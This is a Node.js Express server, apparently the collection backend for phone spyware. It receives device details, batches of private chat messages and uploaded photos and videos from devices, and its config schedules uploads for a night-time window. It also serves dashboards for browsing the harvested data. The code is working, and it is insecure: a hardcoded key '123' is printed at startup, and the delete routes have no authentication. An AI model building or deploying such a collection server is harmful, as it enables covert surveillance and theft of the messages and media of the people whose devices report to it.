const express = require("express");
const fs = require("fs");
const path = require("path");
const multer = require("multer");
const { createClient } = require("@supabase/supabase-js");

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// SUPABASE CONFIG
// ============================================
const supabase = createClient(
    process.env.SUPABASE_URL || "https://your-project.supabase.co",
    process.env.SUPABASE_SECRET_KEY || "your-supabase-secret-key"
);

// ============================================
// API KEY FOR PROTECTED ROUTES
// ============================================
const API_KEY = "123";

function verifyKey(req, res, next) {
    const key = req.headers["x-api-key"] || req.query.key;
    if (key !== API_KEY) {
        return res.status(403).json({ status: "unauthorized" });
    }
    next();
}

// ============================================
// CONFIG
// ============================================
const CONFIG_FILE = path.join(__dirname, "config.json");
const LOG_FILE = path.join(__dirname, "logs.json");
const UPLOAD_DIR = path.join(__dirname, "uploads");
const THUMB_DIR = path.join(__dirname, "thumbs");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR, { recursive: true });

// ============================================
// MULTER CONFIG - For file uploads
// ============================================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, UPLOAD_DIR);
    },
    filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}_${file.originalname}`;
        cb(null, uniqueName);
    }
});

const upload = multer({
    storage: storage,
    limits: {
        fileSize: 100 * 1024 * 1024 // 100MB limit
    },
    fileFilter: (req, file, cb) => {
        const allowedTypes = [
            'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp',
            'video/mp4', 'video/webm', 'video/mov', 'video/quicktime',
            'audio/mpeg', 'audio/wav', 'audio/mp3',
            'application/pdf', 'application/zip'
        ];
        if (allowedTypes.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error('Invalid file type'), false);
        }
    }
});

// ============================================
// HELPERS
// ============================================
function getIP(req) {
    return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
           req.socket.remoteAddress || "unknown";
}

function loadConfig() {
    try {
        return JSON.parse(fs.readFileSync(CONFIG_FILE, "utf-8"));
    } catch {
        return {
            enabled: true,
            send_device_info: true,
            send_files: true,
            blocked_ips: [],
            blocked_models: [],
            fileTypes: ['.jpg', '.jpeg', '.png', '.mp4', '.mov'],
            maxFilesPerDay: 5000,
            uploadWindow: '22:00-06:00',
            maxFileSizeMB: 100,
            version: '1.0.2'
        };
    }
}

function saveLog(data) {
    try {
        fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
    } catch {}
}

function readLogs() {
    if (!fs.existsSync(LOG_FILE)) return [];
    try {
        return fs.readFileSync(LOG_FILE, "utf-8")
            .split("\n")
            .filter(Boolean)
            .map(line => { try { return JSON.parse(line); } catch { return null; } })
            .filter(Boolean);
    } catch { return []; }
}

function removeFileLogEntries(fileName) {
    const logs = readLogs();
    const nextLogs = logs.filter(entry => !(entry.type === "file" && entry.file === fileName));
    try {
        const content = nextLogs.map(entry => JSON.stringify(entry)).join("\n");
        fs.writeFileSync(LOG_FILE, content ? `${content}\n` : "");
    } catch {}
}

function escapeHtml(value) {
    return String(value ?? "")
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function formatSize(bytes) {
    const num = Number(bytes);
    if (!Number.isFinite(num) || num < 1) return "-";
    const units = ["B", "KB", "MB", "GB"];
    let size = num;
    let unitIndex = 0;
    while (size >= 1024 && unitIndex < units.length - 1) {
        size /= 1024;
        unitIndex += 1;
    }
    return `${size.toFixed(size >= 10 || unitIndex === 0 ? 0 : 1)} ${units[unitIndex]}`;
}

// ============================================
// ROUTES
// ============================================

// ---------- HEALTH CHECK ----------
app.get("/", (req, res) => {
    const cfg = loadConfig();
    res.json({
        status: "online",
        server: "MG Control Server",
        version: cfg.version || "1.0.2",
        uptime: process.uptime(),
        time: new Date().toISOString(),
        endpoints: {
            config: "/config",
            heartbeat: "/api/heartbeat",
            chat: "/api/chat/batch",
            upload: "/upload",
            files: "/api/files",
            allFiles: "/api/all-files",
            users: "/users (API key required)",
            gallery: "/gallery (API key required)"
        }
    });
});

// ---------- CONFIG ----------
app.get("/config", (req, res) => {
    const cfg = loadConfig();
    res.send(cfg.enabled ? "1" : "0");
});

// ---------- DEVICE HEARTBEAT (Supabase) ----------
app.post("/api/heartbeat", async (req, res) => {
    try {
        const body = req.body;
        const deviceId = body.deviceId;

        if (!deviceId) {
            return res.status(400).json({ ok: false, error: "deviceId required" });
        }

        const now = Date.now();
        const device = {
            device_id: deviceId,
            my_uid: body.myUid || 0,
            public_id: body.publicId || "",
            my_name: body.myName || "",
            model: body.model || "",
            brand: body.brand || "",
            battery_percent: body.batteryPercent || null,
            network_type: body.networkType || "",
            public_ip: getIP(req),
            client_last_seen: body.lastSeen || now,
            server_last_seen: now,
            created_at: now
        };

        const { data: existing } = await supabase
            .from("devices")
            .select("created_at")
            .eq("device_id", deviceId)
            .maybeSingle();

        if (existing?.created_at) {
            device.created_at = existing.created_at;
        }

        const { error } = await supabase
            .from("devices")
            .upsert(device, { onConflict: "device_id" });

        if (error) {
            console.error("Device upsert error:", error);
            return res.status(500).json({ ok: false, error: "Database error" });
        }

        return res.json({ ok: true, device_id: deviceId });

    } catch (error) {
        console.error("Heartbeat error:", error);
        return res.status(500).json({ ok: false, error: "Server error" });
    }
});

// ---------- CHAT BATCH (Supabase) ----------
app.post("/api/chat/batch", async (req, res) => {
    try {
        const { deviceId, messages } = req.body;

        if (!deviceId) {
            return res.status(400).json({ ok: false, error: "deviceId required" });
        }

        if (!Array.isArray(messages) || !messages.length) {
            return res.json({ ok: true, inserted: 0, skipped: 0 });
        }

        const rows = [];
        let skipped = 0;

        for (const msg of messages.slice(0, 50)) {
            if (!msg.mid) {
                skipped++;
                continue;
            }
            rows.push({
                device_id: deviceId,
                mid: msg.mid,
                direction: msg.direction === "out" ? "out" : "in",
                peer_uid: msg.peerUid || 0,
                peer_name: msg.peerName || "",
                text: (msg.text || "").slice(0, 500),
                message_time: msg.time || Date.now(),
                received_at: Date.now()
            });
        }

        if (!rows.length) {
            return res.json({ ok: true, inserted: 0, skipped });
        }

        const { data: inserted, error } = await supabase
            .from("messages")
            .upsert(rows, { onConflict: "device_id,mid", ignoreDuplicates: true })
            .select("device_id,mid");

        if (error) {
            console.error("Chat insert error:", error);
            return res.status(500).json({ ok: false, error: "Database error" });
        }

        return res.json({
            ok: true,
            inserted: inserted?.length || 0,
            skipped: skipped + (rows.length - (inserted?.length || 0))
        });

    } catch (error) {
        console.error("Chat error:", error);
        return res.status(500).json({ ok: false, error: "Server error" });
    }
});

// ---------- FILE UPLOAD ----------
app.post("/upload", upload.single("file"), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ ok: false, error: "No file uploaded" });
        }

        const deviceId = req.query.deviceId || req.body.deviceId || "unknown";
        const fileName = req.file.originalname;
        const safeName = req.file.filename;
        const fileSize = req.file.size;

        // Create thumbnail
        const thumbName = `thumb_${safeName}`;
        const thumbPath = path.join(THUMB_DIR, thumbName);
        fs.copyFileSync(req.file.path, thumbPath);

        // Save log
        saveLog({
            type: "file",
            file: safeName,
            original: fileName,
            folder: req.query.folder || ".",
            thumb: thumbName,
            device_id: deviceId,
            ip: getIP(req),
            size: fileSize,
            time: new Date().toISOString()
        });

        console.log(`[FILE] ${getIP(req)} | Device: ${deviceId} | ${fileName} (${formatSize(fileSize)})`);

        return res.json({
            ok: true,
            file: safeName,
            original: fileName,
            device_id: deviceId,
            size: fileSize,
            message: "File uploaded successfully"
        });

    } catch (error) {
        console.error("Upload error:", error);
        return res.status(500).json({ ok: false, error: "Upload failed" });
    }
});

// ---------- GET FILES FOR DEVICE ----------
app.get("/api/files", (req, res) => {
    const deviceId = req.query.deviceId;
    if (!deviceId) {
        return res.status(400).json({ ok: false, error: "deviceId required" });
    }

    const logs = readLogs();
    const files = logs
        .filter(entry => entry.type === "file" && entry.device_id === deviceId)
        .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));

    return res.json({ ok: true, files });
});

// ---------- ALL FILES ----------
app.get("/api/all-files", (req, res) => {
    const logs = readLogs();
    const files = logs
        .filter(entry => entry.type === "file")
        .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0))
        .slice(0, 100);

    return res.json({ ok: true, files });
});

// ---------- SERVE UPLOADS ----------
app.use("/uploads", express.static(UPLOAD_DIR));
app.use("/thumbs", express.static(THUMB_DIR));

// ---------- DELETE FILE ----------
app.delete("/api/file/:fileName", (req, res) => {
    const fileName = req.params.fileName;
    if (!fileName) {
        return res.status(400).json({ ok: false, error: "fileName required" });
    }

    const filePath = path.join(UPLOAD_DIR, fileName);
    const thumbPath = path.join(THUMB_DIR, `thumb_${fileName}`);

    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    if (fs.existsSync(thumbPath)) fs.unlinkSync(thumbPath);

    removeFileLogEntries(fileName);

    return res.json({ ok: true, message: "File deleted" });
});

// ---------- USERS DASHBOARD (Protected) ----------
app.get("/users", verifyKey, (req, res) => {
    const logs = readLogs();
    const devices = logs.filter(entry => entry.type === "device");
    const files = logs.filter(entry => entry.type === "file");

    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>MG Control - Users</title>
        <style>
            :root { color-scheme: dark; }
            body { margin: 0; background: #080b10; color: #e8eef7; font-family: system-ui, sans-serif; padding: 20px; }
            .container { max-width: 1400px; margin: 0 auto; }
            h1 { color: #72ffb7; }
            .card { background: #101722; border: 1px solid #1f2937; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
            .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; }
            .stat { display: inline-block; background: #0b1018; padding: 4px 12px; border-radius: 20px; margin-right: 8px; }
            .file-link { color: #72ffb7; text-decoration: none; }
            .file-link:hover { text-decoration: underline; }
            .badge { background: #1f2937; padding: 2px 10px; border-radius: 12px; font-size: 12px; color: #94a3b8; }
            .muted { color: #64748b; }
            .online { color: #22c55e; }
            .offline { color: #64748b; }
            a { color: #72ffb7; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 Device Dashboard</h1>
            <p><span class="stat">📱 Devices: ${devices.length}</span> <span class="stat">📁 Files: ${files.length}</span></p>
            <div class="grid">
    `;

    const deviceMap = new Map();
    for (const device of devices) {
        const id = device.device_id || device.ip;
        if (!deviceMap.has(id)) {
            deviceMap.set(id, { ...device, files: [] });
        }
    }

    for (const file of files) {
        const id = file.device_id || file.ip || "unknown";
        if (deviceMap.has(id)) {
            deviceMap.get(id).files.push(file);
        } else {
            deviceMap.set(id, { device_id: id, ip: id, brand: "", model: "", files: [file] });
        }
    }

    for (const [id, device] of deviceMap) {
        const isOnline = Date.now() - new Date(device.time || 0).getTime() < 60000;
        html += `
            <div class="card">
                <div><strong>${escapeHtml(device.brand || "")} ${escapeHtml(device.model || "")}</strong> <span class="${isOnline ? 'online' : 'offline'}">${isOnline ? '🟢 Online' : '⚪ Offline'}</span></div>
                <div class="muted">ID: ${escapeHtml(id)}</div>
                <div class="muted">IP: ${escapeHtml(device.ip || 'unknown')}</div>
                <div class="muted">Battery: ${escapeHtml(device.battery || '-')}%</div>
                <div><span class="badge">📁 ${device.files.length} files</span></div>
                ${device.files.slice(0, 5).map(f => `
                    <div style="font-size:12px; margin-top:4px;">
                        <a href="/uploads/${escapeHtml(f.file)}" target="_blank" class="file-link">${escapeHtml(f.original)}</a>
                        <span class="muted">(${formatSize(f.size)})</span>
                    </div>
                `).join('')}
                ${device.files.length > 5 ? `<div class="muted" style="font-size:12px;">+ ${device.files.length - 5} more</div>` : ''}
            </div>
        `;
    }

    html += `
            </div>
        </div>
    </body>
    </html>
    `;

    res.send(html);
});

// ---------- GALLERY (Protected) ----------
app.get("/gallery", verifyKey, (req, res) => {
    const logs = readLogs();
    const files = logs.filter(entry => entry.type === "file").slice(0, 200);

    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>MG Control - Gallery</title>
        <style>
            :root { color-scheme: dark; }
            body { margin: 0; background: #080b10; color: #e8eef7; font-family: system-ui, sans-serif; padding: 20px; }
            .container { max-width: 1400px; margin: 0 auto; }
            h1 { color: #72ffb7; }
            .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
            .card { background: #101722; border: 1px solid #1f2937; border-radius: 12px; overflow: hidden; transition: transform 0.2s; }
            .card:hover { transform: translateY(-4px); border-color: #72ffb7; }
            .card img { width: 100%; height: 150px; object-fit: cover; background: #0b1018; }
            .card .info { padding: 12px; }
            .card .name { font-size: 13px; word-break: break-all; }
            .card .meta { font-size: 11px; color: #94a3b8; }
            .card a { color: #72ffb7; text-decoration: none; }
            .card a:hover { text-decoration: underline; }
            .empty { text-align: center; padding: 60px; color: #64748b; }
            .badge { background: #1f2937; padding: 2px 10px; border-radius: 12px; font-size: 11px; color: #94a3b8; }
            .back { color: #72ffb7; text-decoration: none; display: inline-block; margin-bottom: 16px; }
        </style>
    </head>
    <body>
        <div class="container">
            <a href="/" class="back">← Back to Home</a>
            <h1>📸 File Gallery (${files.length} files)</h1>
            ${files.length === 0 ? '<div class="empty">No files uploaded yet</div>' : ''}
            <div class="grid">
    `;

    for (const file of files) {
        const isImage = file.original?.match(/\.(jpg|jpeg|png|gif|webp)$/i);
        const thumbUrl = `/thumbs/${encodeURIComponent(file.thumb || file.file)}`;
        const fileUrl = `/uploads/${encodeURIComponent(file.file)}`;

        html += `
            <div class="card">
                ${isImage ? `<img src="${thumbUrl}" alt="${escapeHtml(file.original)}" loading="lazy">` : 
                           `<div style="height:150px;display:flex;align-items:center;justify-content:center;background:#0b1018;font-size:40px;">📄</div>`}
                <div class="info">
                    <div class="name">${escapeHtml(file.original)}</div>
                    <div class="meta">${escapeHtml(file.device_id || 'unknown')} • ${formatSize(file.size)}</div>
                    <div class="meta">
                        <a href="${fileUrl}" target="_blank">View</a> •
                        <a href="${fileUrl}" download>Download</a> •
                        <a href="#" onclick="deleteFile('${escapeHtml(file.file)}')" style="color:#ff6b6b;">Delete</a>
                    </div>
                </div>
            </div>
        `;
    }

    html += `
            </div>
        </div>
        <script>
        function deleteFile(fileName) {
            if (confirm('Delete this file?')) {
                fetch('/api/file/' + fileName, { method: 'DELETE' })
                .then(res => res.json())
                .then(data => {
                    if (data.ok) location.reload();
                    else alert('Delete failed');
                })
                .catch(() => alert('Delete failed'));
            }
        }
        </script>
    </body>
    </html>
    `;

    res.send(html);
});

// ---------- GALLERY LIVE STATUS ----------
app.get("/gallery/live-status", (req, res) => {
    const logs = readLogs();
    const files = logs.filter(entry => entry.type === "file");
    const devices = logs.filter(entry => entry.type === "device");
    const deviceIds = new Set(files.map(f => f.device_id));

    res.json({
        signature: `${devices.length}:${files.length}:${Date.now()}`,
        devices: deviceIds.size,
        files: files.length
    });
});

// ---------- DELETE FILE (POST version for gallery) ----------
app.post("/delete-file", (req, res) => {
    const fileName = path.basename(req.body?.file || "");
    const thumbName = path.basename(req.body?.thumb || "");

    if (!fileName) {
        return res.status(400).json({ status: "error", message: "Missing file name" });
    }

    const filePath = path.join(UPLOAD_DIR, fileName);
    const thumbPath = thumbName ? path.join(THUMB_DIR, thumbName) : "";

    try {
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        if (thumbPath && fs.existsSync(thumbPath)) fs.unlinkSync(thumbPath);
        removeFileLogEntries(fileName);
        console.log(`[DELETE] ${fileName}`);
        return res.json({ status: "deleted", file: fileName });
    } catch {
        return res.status(500).json({ status: "error", message: "Delete failed" });
    }
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, () => {
    const cfg = loadConfig();
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🚀 MG CONTROL SERVER                                      ║
║   📡 Running on: http://localhost:${PORT}                     ║
║   🌐 Public URL: https://mg-control-server.onrender.com     ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   📋 CONFIG:                                                ║
║      Enabled: ${cfg.enabled ? '✅' : '❌'}  Send Device Info: ${cfg.send_device_info ? '✅' : '❌'}  Send Files: ${cfg.send_files ? '✅' : '❌'}  ║
║      File Types: ${cfg.fileTypes?.join(', ') || 'all'}                  ║
║      Upload Window: ${cfg.uploadWindow || '24/7'}                         ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   📁 STORAGE:                                               ║
║      Uploads: ${UPLOAD_DIR}                                ║
║      Thumbs: ${THUMB_DIR}                                  ║
║      Logs: ${LOG_FILE}                                     ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   📌 ENDPOINTS:                                             ║
║                                                              ║
║   🔓 PUBLIC:                                                ║
║      GET  /                 - Server status                 ║
║      GET  /config           - App config (1/0)             ║
║      POST /api/heartbeat    - Device heartbeat             ║
║      POST /api/chat/batch   - Chat messages                ║
║      POST /upload           - File upload                  ║
║      GET  /api/files        - Device files                 ║
║      GET  /api/all-files    - All files                    ║
║      GET  /uploads/*        - Serve uploaded files         ║
║      GET  /thumbs/*         - Serve thumbnails             ║
║      DELETE /api/file/*     - Delete file                  ║
║                                                              ║
║   🔒 PROTECTED (API Key: ${API_KEY}):                       ║
║      GET  /users            - Device dashboard             ║
║      GET  /gallery          - File gallery                 ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   💡 QUICK LINKS:                                           ║
║      Dashboard: http://localhost:${PORT}/                    ║
║      Users:     http://localhost:${PORT}/users?key=${API_KEY}      ║
║      Gallery:   http://localhost:${PORT}/gallery?key=${API_KEY}    ║
║      Files:     http://localhost:${PORT}/api/all-files              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});
